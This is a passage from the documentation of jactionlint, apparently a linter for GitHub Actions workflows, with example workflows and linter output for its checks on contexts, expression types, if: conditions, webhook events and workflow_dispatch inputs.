   |                        ^~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqMUk1v6yAQvOdXzOFJJFJsKU+xIiG9XxK9A7FxQmsDYiFplfLfK+JQ58NVe0K7zCyzMxjNYQMdZi9mR3wGeEk+nQB5J7zcvw8V0Avv1FuuAEMc27AL2oeiE4m3xEnpxpzoWv//wmrTSI7tar3EqhrbVtSvYi/HmUABLXrJwVpj2E0fMNYro0XH4V2QU5SdcN9RWtHRyFG67kLz+O5F46q6m6Btz7Epq3J9abugqUie/Tmfr4aUhhDj1TFpKQ8tEphD1gcDdgO3nfCtcT1iZD9BB3vKRh6f0R83OgdmCuRRF3tCpTVxlI7Uwx6XiylGTgkT0pLziBHzbPW/CVC+Q4yLyZ217bMkKAJZWatWyWbUotrh+dpoL5SmeRZt+yXYpqzYYkgh/bu//D6su0/6+6QGAz8HAKxO5N4=)

jactionlint types the `matrix` context from the `matrix:` section of the job. The type of a matrix value is deduced from the elements of its array. When the elements are objects, their properties are checked strictly, like `package.name` in the example. The values that `include:` adds are supported, and the `matrix` of another job is not accessible. When `strategy` is one expression, `matrix` is any object and none of its properties is reported (see [Expressions for a whole mapping or list](#check-whole-value-expressions)).

When the elements of an array do not have the same type, the type of the matrix value falls back to `any`:

```yaml
strategy:
  matrix:
    foo:
      - 'string value'
      - 42
      - {aaa: true, bbb: null}
    bar:
      - [42]
      - [true]
      - [{aaa: true, bbb: null}]
      - []
steps:
  # matrix.foo is any type value
  - run: echo ${{ matrix.foo }}
  # matrix.bar is array<any> type value
  - run: echo ${{ matrix.bar[0] }}
  # ERROR: Array cannot be evaluated as string
  - run: echo ${{ matrix.bar }}
```

<a id="check-contextual-needs-object"></a>
## Contextual typing for `needs` object

The rule `undefined-property` (`correctness` profile) reports a read of `needs.<job_id>` for a job that the current job does not list in `needs:`, and an output that the needed job does not define.

Example input:

```yaml
on: push
jobs:
  install:
    outputs:
      installed: '...'
    runs-on: ubuntu-latest
    steps:
      - run: echo 'install something'
  prepare:
    outputs:
      prepared: '...'
    runs-on: ubuntu-latest
    steps:
      - run: echo 'parepare something'
      # ERROR: Outputs in other job is not accessible
      - run: echo '${{ needs.prepare.outputs.prepared }}'
  build:
    needs: [install, prepare]
    outputs:
      built: '...'
    runs-on: ubuntu-latest
    steps:
      # OK: Accessing job results
      - run: echo 'build something with ${{ needs.install.outputs.installed }} and ${{ needs.prepare.outputs.prepared }}'
      # ERROR: Accessing undefined output causes an error
      - run: echo '${{ needs.install.outputs.foo }}'
      # ERROR: Accessing undefined job ID
      - run: echo '${{ needs.some_job }}'
  other:
    runs-on: ubuntu-latest
    steps:
      # ERROR: Cannot access outputs across jobs
      - run: echo '${{ needs.build.outputs.built }}'
```

Output:

```
test.yaml:16:24: property "prepare" is not defined in object type {} [undefined-property]
   |
16 |       - run: echo '${{ needs.prepare.outputs.prepared }}'
   |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:17:3: job "build" reads "needs.some_job" but has no "if" with a status check function, so GitHub skips the job when a job it needs fails or is skipped, and a skipped job counts as passing for a required check. add "if: ${{ !cancelled() }}" (or "always()") to the job [gate-job-skipped-on-failure]
   |
17 |   build:
   |   ^~~~~~
test.yaml:26:24: property "foo" is not defined in object type {installed: string} [undefined-property]
   |
26 |       - run: echo '${{ needs.install.outputs.foo }}'
   |                        ^~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:28:24: property "some_job" is not defined in object type {install: {outputs: {installed: string}; result: string}; prepare: {outputs: {prepared: string}; result: string}} [undefined-property]
   |
28 |       - run: echo '${{ needs.some_job }}'
   |                        ^~~~~~~~~~~~~~
test.yaml:33:24: property "build" is not defined in object type {} [undefined-property]
   |
33 |       - run: echo '${{ needs.build.outputs.built }}'
   |                        ^~~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqkkUFOxDAMRfdzir9A6ob2ALkKQqglhnRU4qh2xGLUuyNnMqmAESBmUamu7f/+dzk6pCzhcORJ3AGYo+i4LPYKcNaUVc5F65F36IZh6MrnNUfpTSZPOWrul1FJtLREKbXl3iYd6DkwuqoE4TfSMMdX00orpXGlq+jau51sKvZ8Rn8buzudEIm8DJU8VEOX2mPbbHPK8+LPpDLv8FDD3V9MP14LZHt6c5pC36PgfdaA3Xt10ry3H4htwxg9/hzzhwN9hbww/75klp+OPNVJ1kCr+/8dduFykebFKjXGxwDMHOsV)

A job runs after all jobs in [`needs:`](https://docs.github.com/en/actions/learn-github-actions/workflow-syntax-for-github-actions#jobsjob_idneeds) are done. Their outputs are read through [the `needs` context](https://docs.github.com/en/actions/learn-github-actions/contexts#needs-context), and only by a job that lists them in its own `needs:`, not through another job.

jactionlint types `needs` contextually, by looking at the `outputs:` section and the `needs:` section of each job. For each needed job, `needs.<job_id>.outputs.<name>` and `needs.<job_id>.result` are known.

The output of the example has one more finding that is not about typing: `gate-job-skipped-on-failure` reports that the job `build` reads `needs` without an `if:` that has a status check function. See [Gate jobs that are skipped when a job fails](#check-gate-job-skipped-on-failure).

<a id="check-contextual-github-event"></a>
## Contextual typing for `github.event` object

The rule `undefined-property` (`correctness` profile) also checks the names of the properties that a workflow reads from `github.event`, the payload of the webhook event that started the run: a property that no webhook event has at that place is reported, with a suggestion when the name is close to a known one.

Example input:

```yaml
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
jobs:
  report:
    runs-on: ubuntu-latest
    steps:
      # ERROR: Typo of workflow_run
      - run: echo "${{ github.event.worflow_run.conclusion }}"
      # ERROR: Typo of a property of the workflow run
      - run: echo "${{ github.event.workflow_run.head_brach }}"
      # ERROR: Typo of a property of the elements of an array
      - run: echo "${{ join(github.event.workflow_run.pull_requests.*.nubmer, ', ') }}"
      # OK: These are in the payload
      - run: echo "${{ github.event.workflow_run.conclusion }} ${{ github.event.workflow_run.pull_requests[0].number }}"
```

Example file: .github/workflows/ci.yml

```yaml
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo build
```

Output:

```
test.yaml:10:24: property "worflow_run" is not defined in github.event: no webhook event has it in its payload. did you mean "workflow_run"? [undefined-property]
   |
10 |       - run: echo "${{ github.event.worflow_run.conclusion }}"
   |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:12:24: property "head_brach" is not defined in github.event.workflow_run: no webhook event has it in its payload. did you mean "head_branch"? [undefined-property]
   |
12 |       - run: echo "${{ github.event.workflow_run.head_brach }}"
   |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:14:29: property "nubmer" is not defined in github.event.workflow_run.pull_requests.*: no webhook event has it in its payload. did you mean "number"? [undefined-property]
   |
14 |       - run: echo "${{ join(github.event.workflow_run.pull_requests.*.nubmer, ', ') }}"
   |                             ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqcj09Lw0AQxe/9FEMRqtIsnnP15GcoIWS3o0ndzKzzxyCl312SotKDRTzO2/fb9x5TvQKYWF6fM0+t+HL/KFrD7vGpWTT7KDjficeS0XDfrA4cdQYEC4udUXHSiqkGj07mVe4M1ZYnNSx6dgFUs7MGTD3D+uZ4hJfBeo8B35EsTCxfjUJiStl1YILTaf1X/HtR6LHbt1G61F/jDzzQ7e+fFM+5FXxzVNNwH8jjiLKFzRY2d//rdbELrnsv4ncPTSAfI8oc/DkANsuZCg==)

The type of `github.event` stays an untyped object, but the names are checked on the top level and in the objects below it (`github.event.pull_request`, `github.event.workflow_run.head_commit`, the elements of `github.event.commits` and so on), down to three levels of objects, which is as far as the payloads are known for certain. The names come from the JSON schemas of the webhooks of [octokit/webhooks](https://github.com/octokit/webhooks/tree/main/payload-schemas) and from the webhooks of [the OpenAPI description of the REST API of GitHub](https://github.com/github/rest-api-description). A property is known when either of them has it, in the payload of any activity type of any event.

**What is not checked.** To keep a false finding out of the default profile, jactionlint does not check:

- the contents of an account, an app, an installation or a licence (`sender`, `pull_request.user`, `organization`, ...), because GitHub adds properties to them from time to time. The property itself (`github.event.sender`) is checked
- objects that are arbitrary or hold the old values of an edit: `changes`, `inputs`, `client_payload` and the `payload` of a deployment, and everything deeper than three levels of objects
- the whole payload of a workflow that has `workflow_dispatch`, `repository_dispatch`, `schedule`, `workflow_call` or `image_version` in `on:`, and of an event that has no schema. The payload of a composite action or a reusable workflow is the one of its caller, so it is not checked either

**A property of another event.** By default a property is reported when no webhook event has it. A read of the property of another event, such as `github.event.pull_request.number` in a workflow that runs on `push`, is not reported: it evaluates to null, which workflows often rely on (`${{ github.event.pull_request.number || github.ref }}`). The option `strict-event-payloads` of `undefined-property` makes the rule report such a read too, with the properties of the events of the workflow (the union of their payloads, so a property that one of several events has is fine). The `pedantic` profile turns it on, and this configuration turns it on alone:

```yaml
rules:
  undefined-property:
    strict-event-payloads: true
```

With that option, the step `echo "${{ github.event.pull_request.number || github.ref }}"` of a workflow with `on: push` is reported:

```
test.yaml:6:24: property "pull_request" is not defined in github.event, the payload of the event "push". available properties are "after", "base_ref", "before", "commits", "compare", "created", "deleted", "enterprise", "forced", "head_commit", "installation", "organization", "pusher", "ref", "repository", "sender" [undefined-property]
```

**Ignore.** Silence a finding like any other, with an [ignore comment](./ignore.md#ignore-some-errors) on its line. `rules: {undefined-property: off}` also switches off the checks of every other property in expressions.

<a id="check-whole-value-expressions"></a>
## Expressions for a whole mapping or list

The rules `context-availability` and `expression-type` also check a value that is one expression `${{ }}` where a key takes a mapping or a list. The expression is checked with the contexts that are available at its key and with the type that the key expects, and the rules that depend on the value treat it as unknown instead of guessing.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ${{ matrix.os }}
    # OK: the strategy and its matrix are whatever the expression evaluates to
    strategy: ${{ fromJSON(vars.STRATEGY) }}
    # OK: the "run" defaults of a job, the ports and volumes of a container, and "with" can be one expression
    defaults:
      run: ${{ fromJSON(vars.RUN_DEFAULTS) }}
    container:
      image: node:20
      ports: ${{ fromJSON(vars.PORTS) }}
    env:
      # OK: "${{ insert }}" adds the entries of a mapping
      ${{ insert }}: ${{ matrix.env || fromJSON('{}') }}
    steps:
      # OK: the inputs are not known, so no input is reported as missing
      - uses: actions/cache@v4
        with: ${{ fromJSON(vars.CACHE_INPUTS) }}
  wrong:
    runs-on: ubuntu-latest
    # ERROR: The steps context is not available in "strategy"
    strategy: ${{ fromJSON(steps.setup.outputs.strategy) }}
    steps:
      # ERROR: A string is not a mapping
      - uses: actions/checkout@v4
        with: ${{ github.sha }}
```

Output:

```
test.yaml:23:28: context "steps" is not allowed here. available contexts are "github", "inputs", "needs", "vars". see https://docs.github.com/en/actions/learn-github-actions/contexts#context-availability for more details [context-availability]
   |
23 |     strategy: ${{ fromJSON(steps.setup.outputs.strategy) }}
   |                            ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:27:15: type of expression at "with" must be object but found type string [expression-type]
   |
27 |         with: ${{ github.sha }}
   |               ^~~
```

[Playground](https://jactionlint.jdx.dev/#eNqMkU1PMkEQhO/8ij68CS8HRmM87UmC+BUDhI+DJzIszc4ozGymuxcNzH83Cyyo2RhPm2xVPanq8S6BXMg0Xv2ckgYAI3H5BQjiqF3q/7ZbWGsO9l15ghj3KnHQjNnHQV4Gv34aD/r/Cx1IjSejzqR3/9KqzAtcalkxHcB7dF1uNO3Pbnt3nenzZHzKpt6xtg5DFbZrnWECzi8wubo8/sx9YKpjDgejLzB0RYUprdYRBoYYv41EV8Bud+Y0t7HZOu/G/LSjDUJICeiUrXd0kerU4E1xfZQBNpZNXatup/vQmz32h9NTuU3wLvtxeZmLY2mvdPkqv51930oRsuTKC+fCpCrrH6sbTN+8cH37zLKRuSKjIcbPAQCqSa3j)

**Where an expression is valid.** The schema of GitHub Actions gives some keys a list of contexts, and a value that is one expression `${{ }}` is valid there instead of the mapping or the list. These are `strategy` and its `matrix`, `include` and `exclude`, `env`, the `run` section of `defaults` of a job, `container` and `services` (the whole value, `env`, `credentials`, `ports` and `volumes`), `concurrency`, `environment`, `runs-on` and `with` of a step. An expression is not valid for `defaults` of a workflow, `with` and `secrets` of a job that calls a reusable workflow, `needs`, `steps` and `permissions`, which have no contexts.

**What is checked.** The contexts that are available at the key (see [Availability of contexts and special functions](#ctx-spfunc-availability)) and the type: a mapping is expected where `with`, `strategy` or `env` are, and a list where `ports` or `volumes` are. In the example, `steps` is not available in `strategy`, and a string is not a mapping at `with`.

**What the other rules do with it.** Rules that depend on what the expression evaluates to treat it as unknown:

- `matrix` is any object when `strategy` is an expression, so no property of it is reported as undefined.
- The inputs of a step are unknown when its `with` is an expression or has a `${{ insert }}` key, so `missing-action-input` and the rules that look for an input that is not set (`artipacked`, `cache-poisoning`, `github-app`, `unpinned-tools` and `agentic-actions`) do not report the step. The inputs written next to the expression are still checked (`unknown-action-input`).
- The shell of a job is unknown when its `defaults.run` is an expression, so the rules that judge a script by its shell skip it.
- `concurrency: ${{ ... }}` can be a group name or a whole configuration, so `concurrency-limits` does not take it for a group name that cannot cancel runs.
- A constant is evaluated where a check needs its value: `queue: ${{ 'max' }}` together with `cancel-in-progress: true` is reported like `queue: max`.

<a id="ctx-spfunc-availability"></a>
## Availability of contexts and special functions

The rule `context-availability` (`correctness` profile) reports a context or a special function that is used at a key where GitHub Actions does not provide it.

Example input:

```yaml
on: push

defaults:
  run:
    # ERROR: No context is available here
    shell: ${{ env.SHELL }}

jobs:
  test:
    strategy:
      matrix:
        directory:
          # OK: 'github' context is available here
          - ${{ github.workflow }}
          # ERROR: 'runner' context is not available here
          - ${{ runner.temp }}
    runs-on: ubuntu-latest
    defaults:
      run:
        # OK: 'env' context is available here
        shell: ${{ env.SHELL }}
    env:
      # ERROR: 'env' context is not available here
      FOO: ${{ env.BAR }}
    steps:
      - env:
          # OK: 'env' context is available here
          FOO: ${{ env.BAR }}
        # ERROR: No context is available here
        shell: ${{ env.SHELL}}
        # ERROR: 'success()' function is not available here
        run: echo 'Success? ${{ success() }}'
        # OK: 'success()' function is available here
        if: success()
```

Output:

```
test.yaml:6:16: context "env" is not allowed here. no context is available here. see https://docs.github.com/en/actions/learn-github-actions/contexts#context-availability for more details [context-availability]
  |
6 |     shell: ${{ env.SHELL }}
  |                ^~~~~~~~~
test.yaml:16:17: context "runner" is not allowed here. available contexts are "github", "inputs", "needs", "vars". see https://docs.github.com/en/actions/learn-github-actions/contexts#context-availability for more details [context-availability]
   |
16 |           - ${{ runner.temp }}
   |                 ^~~~~~~~~~~
test.yaml:24:16: context "env" is not allowed here. available contexts are "github", "inputs", "matrix", "needs", "secrets", "strategy", "vars". see https://docs.github.com/en/actions/learn-github-actions/contexts#context-availability for more details [context-availability]
   |
24 |       FOO: ${{ env.BAR }}
   |                ^~~~~~~
test.yaml:30:20: context "env" is not allowed here. no context is available here. see https://docs.github.com/en/actions/learn-github-actions/contexts#context-availability for more details [context-availability]
   |
30 |         shell: ${{ env.SHELL}}
   |                    ^~~~~~~~~
test.yaml:32:33: calling function "success" is not allowed here. "success" is only available in "jobs.<job_id>.if", "jobs.<job_id>.steps.if", "jobs.<job_id>.snapshot.if". see https://docs.github.com/en/actions/learn-github-actions/contexts#context-availability for more details [context-availability]
   |
32 |         run: echo 'Success? ${{ success() }}'
   |                                 ^~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNp8j01q60AQhPdzilo88MtCOoA2IYGELAyG+ASS3LKUjGdE/8QxRncPI1uWCDiroaa+7qqOoUBv0jq3o6Y0r1I4gC2kB5CWvC/w73wGha98+/ayXmMYnPuI1UgqiV5R5VJpf7oo4FAqd9+TAnYdU62RT/MXkI2r9522VuXHyJ+Nj8cU8BthC4E4Vzr0k80WJEv9rbKglvkylRmt5S1XdE69dxOA9DGBr5vNDD0/vU+IKPW3xdly4q+pe8ELO5UE1W3Eamt1TSKPIysX8f8Bw7C60V1TzM7PAHL9fcg=)

Some contexts are available only at some keys. For example, the `env` context is not available at `jobs.<job_id>.env`, but it is available at `jobs.<job_id>.steps.env`. Some functions are special in the same way:

- `success()`, `failure()`, `always()` and `cancelled()` are available only in the `if:` of a job and of a step.
- `hashFiles()` is available only at the keys of a step: `name`, `if`, `env`, `run`, `with`, `working-directory`, `timeout-minutes` and `continue-on-error`.

[The context availability table of GitHub](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs#context-availability) lists which contexts and special functions are available at which workflow keys. jactionlint reports a context or a special function that is used where the table does not list it. The finding says which contexts are available at that key or, for a special function, at which keys the function is available.

**Related.** [Expressions for a whole mapping or list](#check-whole-value-expressions) applies the same table to a value that is one expression.

<a id="if-cond-constant"></a>
## Constant conditions at `if:`

The rules `constant-condition` and `if-always-true` (both in the `correctness` profile) report an `if:` condition that never depends on the run: a constant such as `if: false`, or a condition that is always true because of the characters around `${{ }}`.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "DEBUG! ${{ github.event_name }}"
        # ERROR: It is always evaluated to false
        if: false
      - run: echo 'Commit is pushed'
        # OK
        if: ${{ github.event_name == 'push' }}
      - run: echo 'Commit is pushed'
        # OK
        if: |
          github.event_name == 'push'
      - run: echo 'Commit is pushed'
        # OK: GitHub trims the newline at the end of the block scalar
        if: |
          ${{ github.event_name == 'push' }}
      - run: echo 'Commit is pushed'
        # ERROR: It is always evaluated to true
        if: "${{ github.event_name == 'push' }} "
      - run: echo 'Commit is pushed to main'
        # OK
        if: github.event_name == 'push' && github.ref_name == 'main'
      - run: echo 'Commit is pushed to main'
        # ERROR: It is always evaluated to true
        if: ${{ github.event_name == 'push' }} && ${{ github.ref_name == 'main' }}
```

Output:

```
test.yaml:9:13: constant expression "false" in condition. remove the if: section [constant-condition]
  |
9 |         if: false
  |             ^~~~~
test.yaml:23:13: if: condition "${{ github.event_name == 'push' }} " is always evaluated to true because extra characters are around ${{ }} [if-always-true]
   |
23 |         if: "${{ github.event_name == 'push' }} "
   |             ^~~~
test.yaml:29:13: if: condition "${{ github.event_name == 'push' }} && ${{ github.ref_name == 'main' }}" is always evaluated to true because extra characters are around ${{ }} [if-always-true]
   |
29 |         if: ${{ github.event_name == 'push' }} && ${{ github.ref_name == 'main' }}
   |             ^~~
```

[Playground](https://jactionlint.jdx.dev/#eNq0zz1OxDAQBeA+p3hYyK7CASxtw484ATVyYEKM1vZqZ0yz+O7Iy18iohBAVFH03nwzTtFil3lomsfUsW0AIZb6BfY5clsLuctRcrt1NTtGLLTj1xbQ1qYF3Q0J6vLq/Ob6BKeHAx68DLk7oyeKchtdIJSi3mYA31v0bss0o5iLFIIXeD4eR/dmMjaPbzYwtW1Qys/N548/LNl/g//jcPU9CrWGhSQE5+OUX5K1fo/31H+GY+QXG1e8R+tx6+tylPIyANrl1qA=)

**What is reported.**

- A constant condition (`constant-condition`), such as `if: true` or `if: false`. It is usually leftover debug code, like `#if 0` in C.
- Characters around `${{ }}` (`if-always-true`). The condition is then a string, hence it is always evaluated to true: `if: "${{ github.event_name == 'push' }} "` and `if: ${{ github.event_name == 'push' }} && ${{ github.ref_name == 'main' }}` are both always true.

**Fix.** Delete the `if: true` line, which does not affect the workflow. `if: false` means that the step or job never runs: comment out or delete the step or job, and do not delete only the `if:` line, which would make it run. For characters around `${{ }}`, write the whole condition in one `${{ }}`, or without `${{ }}` like `if: github.event_name == 'push' && github.ref_name == 'main'`. Neither rule has an automatic fix.

**How the condition is evaluated.** When the expression in `${{ }}` evaluates to a boolean and nothing is around the `${{ }}`, the condition is that boolean. Otherwise the condition is treated as a string, hence it is always evaluated to true. Characters other than newlines at the end count as extra characters. A multi-line string has a newline at the end of each line, so

```yaml
if: |
  ${{ false }}
  && ${{ true }}
```

is equivalent to `if: "${{ false }}\n&& ${{ true }}\n"`, which is always true.

**Newlines at the end.** A block scalar (`if: |`) ends with a newline, and GitHub trims trailing newlines of the condition: the [GitHub changelog](https://github.blog/changelog/2026-01-29-github-actions-smarter-editing-clearer-debugging-and-a-new-case-function/) says that "Trailing newlines will automatically be trimmed". So `if: |` followed by one `${{ }}` expression is evaluated as that expression, and `if-always-true` does not report it. [actionlint](./actionlint.md) reports it. Other white space, such as a space at the end or a newline at the start, is still reported because GitHub does not say that it trims it.

**White space around an expression without `${{ }}`.** An expression written without `${{ }}` ignores the white space around it, which is why this condition works as intended:

```yaml
if: |
  false
```

**Related.** `if-always-true` is the equivalent of the audit `unsound-condition` of zizmor; see [the comparison with zizmor](./zizmor-parity.md).

<a id="check-require-expression-wrapping"></a>
### Require `${{ }}` in `if:` conditions (pedantic)

The rule `require-expression-wrapping` (`pedantic` profile) reports an `if:` condition of a job or a step that is written without `${{ }}`. GitHub Actions allows omitting `${{ }}` there, but some projects prefer to always write it so that it is obvious that an expression is used. With the rule on, `if: github.ref == 'refs/heads/main'` is reported and `if: ${{ github.ref == 'refs/heads/main' }}` is accepted. Other keys are not affected, because they always need `${{ }}` to evaluate an expression. The rule has no automatic fix.

**Configure.** The rule is off unless you choose the `pedantic` profile. To turn it on alone, set it in [the config file](./config.md#rules):

```yaml
rules:
  require-expression-wrapping: error
```

<a id="check-falsy-ternary"></a>
### Falsy value in the `a && b || c` ternary idiom

The rule `unsound-ternary` (`correctness` profile) reports the idiom `cond && b || c` when `b` is a literal that is always falsy: `''`, `0`, `false` or `null`. The idiom is commonly used as a ternary operator, but it works only when `b` is truthy. Otherwise the result is always `c`.

**Configure.** To turn the rule off, set it in [the config file](./config.md#rules):

```yaml
rules:
  unsound-ternary: off
```

**What is reported.** Non-literal values for `b` (for example `github.sha`) are not reported, because whether they are falsy is unknown statically. In the `env:` of a step (the `env` context is not available in the `env:` of a workflow or of a job), this is reported:

```yaml
env:
  # Always evaluated to 'staging-' regardless of the condition
  PREFIX: ${{ env.DEPLOY == 'true' && '' || 'staging-' }}
```

**Fix.** Choose a truthy value for `b`, or use `case(cond, b, c)`, which takes pairs of a predicate and a value, then a default. The rule has no automatic fix.

<a id="check-webhook-events"></a>
## Webhook events validation

The rules `unknown-event`, `invalid-activity-type`, `invalid-event-filter` and `invalid-event-config` report webhook events under `on:` that GitHub cannot use: an event that does not exist, an activity type or a filter that the event does not have, filters that exclude each other, and an event configured with options it does not support.

Example input:

```yaml
on:
  push:
    # ERROR: Incorrect filter. 'branches' is correct
    branch: foo
    # ERROR: Both 'paths' and 'paths-ignore' filters cannot be used for the same event
    paths: path/to/foo
    paths-ignore: path/to/foo
  issues:
    # ERROR: Incorrect type. 'opened' is correct
    types: created
  release:
    # ERROR: 'tags' filter is not available for 'release' event
    tags: v*.*.*
  # ERROR: Unknown event name
  pullreq:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo ...
```

Output:

```
test.yaml:4:5: unexpected key "branch" for "push" section. expected one of "branches", "branches-ignore", "paths", "paths-ignore", "tags", "tags-ignore", "types", "workflows" [workflow-syntax]
  |
4 |     branch: foo
  |     ^~~~~~~
test.yaml:7:5: both "paths" and "paths-ignore" filters cannot be used for the same event "push". note: use '!' to negate patterns [invalid-event-filter]
  |
7 |     paths-ignore: path/to/foo
  |     ^~~~~~~~~~~~~
test.yaml:10:12: invalid activity type "created" for "issues" Webhook event. available types are "assigned", "closed", "deleted", "demilestoned", "edited", "field_added", "field_removed", "labeled", "locked", "milestoned", "opened", "pinned", "reopened", "transferred", "typed", "unassigned", "unlabeled", "unlocked", "unpinned", "untyped" [invalid-activity-type]
   |
10 |     types: created
   |            ^~~~~~~
test.yaml:13:5: "tags" filter is not available for release event. it is only for push event [invalid-event-filter]
   |
13 |     tags: v*.*.*
   |     ^~~~~
test.yaml:15:3: unknown Webhook event "pullreq". see https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#webhook-events for list of all Webhook event names [unknown-event]
   |
15 |   pullreq:
   |   ^~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpcjkGuwyAMRPecYtaRIHvfhuT7h1QIU2wq9fYVJJt2NbLf6NlSyAG1axoJbC2WPRH+ReZcoyWlGavJ+rX251Gk8S89VTvrpbN3ZSXsjaPxnwMaZ47KN42HEl5LWMIyv8i58ZOce8g2BcZqV7X1ol4KoW+9WPc5DjaRGtf7HOBHk8B7EoQQPgMAdVRCRg==)

At `on:`, webhook events trigger the workflow. The [webhook event documentation](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#webhook-events) defines which events exist and which activity types each of them accepts at `types:`. The events and the activity types that jactionlint knows are built into the binary.

**What is reported.**

- An event name that does not exist (`unknown-event`). The events of classic Projects (`project`, `project_card` and `project_column`) and `pull_request_comment` are reported as unknown events, with a message that says why and what to use instead (`issue_comment` for a comment on a pull request).
- An activity type that the event does not have (`invalid-activity-type`). `merge_group` runs a workflow only for the `checks_requested` activity type (the documentation and the workflow schema of GitHub list only that type, not the `destroyed` type of the webhook), so `types: [destroyed]` is reported.
- A filter that the event does not have, and filters that exclude each other (`invalid-event-filter`). `paths` and `paths-ignore`, `branches` and `branches-ignore`, and `tags` and `tags-ignore` cannot be used for the same event: use `!` patterns to negate instead.
- An event configured with options it does not support (`invalid-event-config`): `workflow_run` without `workflows:`, `workflows:` on another event, or `types:` on an event that has no activity types.

Some filters are only available for specific events, as [the official documentation](https://docs.github.com/en/actions/using-workflows/triggering-a-workflow#using-filters-to-target-specific-paths-for-pull-request-or-push-events) explains:

| Filter name       | Events where the filter is available                                         |
|-------------------|------------------------------------------------------------------------------|
| `paths`           | `push`, `pull_request`, `pull_request_target`                                |
| `paths-ignore`    | `push`, `pull_request`, `pull_request_target`                                |
| `branches`        | `merge_group`, `push`, `pull_request`, `pull_request_target`, `workflow_run` |
| `branches-ignore` | `merge_group`, `push`, `pull_request`, `pull_request_target`, `workflow_run` |
| `tags`            | `push`                                                                       |
| `tags-ignore`     | `push`                                                                       |

A misspelled filter name, such as `branch:` for `branches:`, is reported as `workflow-syntax`. The patterns of the filters are checked by [Glob filter pattern syntax validation](#check-glob-pattern).

<a id="check-workflow-dispatch-events"></a>
## Workflow dispatch event validation

The rule `invalid-workflow-dispatch-input` reports an input of the `workflow_dispatch` event that cannot work: a `choice` input without `options:`, a default value that does not fit the type of the input, or more than 25 inputs.

Example input:

```yaml
on:
  workflow_dispatch:
    inputs:
      # Unknown input type
      id:
        type: text
      # ERROR: No options for 'choice' input type
      kind:
        type: choice
      name:
        type: choice
        options:
          - Tama
          - Mike
        # ERROR: Default value is not in options
        default: Chobi
      message:
        type: string
      verbose:
        type: boolean
        # ERROR: Boolean value must be 'true' or 'false'
        default: yes
      age:
        type: number
        # ERROR: Number value must be parsed as a float number
        default: teen

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: Undefined input
      - run: echo "${{ inputs.massage }}"
      # ERROR: Bool value is not available for object key
      - run: echo "${{ env[inputs.verbose] }}"
      # ERROR: Number value is not available for object key
      - run: echo "${{ env[inputs.age] }}"
      # ERROR: `github.event.inputs` is also not defined
      - run: echo "${{ github.event.inputs.massage }}"
```

Output:

```
test.yaml:6:15: input type of workflow_dispatch event must be one of "string", "number", "boolean", "choice", "environment" but got "text" [workflow-syntax]
  |
6 |         type: text
  |               ^~~~
test.yaml:8:7: input type of "kind" is "choice" but "options" is not set [invalid-workflow-dispatch-input]
  |
8 |       kind:
  |       ^~~~~
test.yaml:16:18: default value "Chobi" of "name" input is not included in its options "Tama", "Mike" [invalid-workflow-dispatch-input]
   |
16 |         default: Chobi
   |                  ^~~~~
test.yaml:22:18: type of "verbose" input is "boolean". its default value "yes" must be "true" or "false" [invalid-workflow-dispatch-input]
   |
22 |         default: yes
   |                  ^~~
test.yaml:26:18: type of "age" input is "number" but its default value "teen" cannot be parsed as a float number: strconv.ParseFloat: parsing "teen": invalid syntax [invalid-workflow-dispatch-input]
   |
26 |         default: teen
   |                  ^~~~
test.yaml:33:24: "inputs.massage" is an input chosen by whoever runs this, which is not validated and can hold shell syntax. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
33 |       - run: echo "${{ inputs.massage }}"
   |                        ^~~~~~~~~~~~~~
test.yaml:33:24: property "massage" is not defined in object type {age: number; id: any; kind: string; message: string; name: string; verbose: bool} [undefined-property]
   |
33 |       - run: echo "${{ inputs.massage }}"
   |                        ^~~~~~~~~~~~~~
test.yaml:35:28: property access of object must be type of string but got "bool" [expression-type]
   |
35 |       - run: echo "${{ env[inputs.verbose] }}"
   |                            ^~~~~~~~~~~~~~~
test.yaml:37:28: property access of object must be type of string but got "number" [expression-type]
   |
37 |       - run: echo "${{ env[inputs.age] }}"
   |                            ^~~~~~~~~~~
test.yaml:39:24: "github.event.inputs.massage" is an input chosen by whoever runs this, which is not validated and can hold shell syntax. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
39 |       - run: echo "${{ github.event.inputs.massage }}"
   |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:39:24: property "massage" is not defined in object type {age: string; id: string; kind: string; message: string; name: string; verbose: string} [undefined-property]
   |
39 |       - run: echo "${{ github.event.inputs.massage }}"
   |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~
```

